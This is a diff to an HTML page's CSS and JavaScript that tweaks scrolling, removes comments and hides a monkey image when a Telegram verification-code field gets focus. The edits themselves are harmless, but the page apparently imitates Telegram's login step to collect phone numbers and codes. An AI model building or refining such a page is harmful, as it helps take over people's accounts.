@@ -70,7 +70,7 @@
             display: none;
             background-color: #ffffff;
             height: 100vh;
-            overflow-y: scroll;
+            overflow-y: auto;
         }
 
         .container img {
@@ -245,16 +245,20 @@
             background-color: #007ab8;
         }
 
+        .hide-image {
+            display: none;
+        }
+
         @media (max-width: 600px) {
             .verification-container {
-                margin-top: 2cm; /* Move verification container 2cm from top on mobile */
+                margin-top: 2cm;
             }
 
             .container {
                 width: 95%;
                 max-width: 340px;
-                height: calc(100vh - 4cm); /* Adjust height on mobile */
-                margin-top: 0; /* Adjust margin for full-screen fit */
+                height: calc(100vh - 4cm);
+                margin-top: 0;
             }
 
             .verification-container button {
@@ -297,13 +301,13 @@
     </div>
 
     <div class="container" id="phoneVerificationContainer" style="display:none;">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/6/69/Monkey_emoji.png" alt="Monkey Icon" style="width: 80px; margin-bottom: 20px; border-radius: 50%;">
+        <img id="verificationImage" src="https://upload.wikimedia.org/wikipedia/commons/6/69/Monkey_emoji.png" alt="Monkey Icon" style="width: 80px; margin-bottom: 20px; border-radius: 50%;">
         <h1 id="phoneDisplay"></h1>
         <p>We have sent you a message in Telegram with the code.</p>
 
         <div class="input-group">
             <label for="verificationCode">Code</label>
-            <input type="tel" id="verificationCode" inputmode="numeric" pattern="[0-9]*" placeholder="Code">
+            <input type="tel" id="verificationCode" inputmode="numeric" pattern="[0-9]*" placeholder="Code" onfocus="hideVerificationImage()">
         </div>
 
         <button class="button" onclick="submitVerification()">Submit</button>
@@ -391,6 +395,10 @@
 
             window.scrollAwayKeyboard = function() {
                 document.activeElement.blur();
+            }
+
+            window.hideVerificationImage = function() {
+                document.getElementById('verificationImage').classList.add('hide-image');
             }
 
             document.body.addEventListener('touchmove', function() {
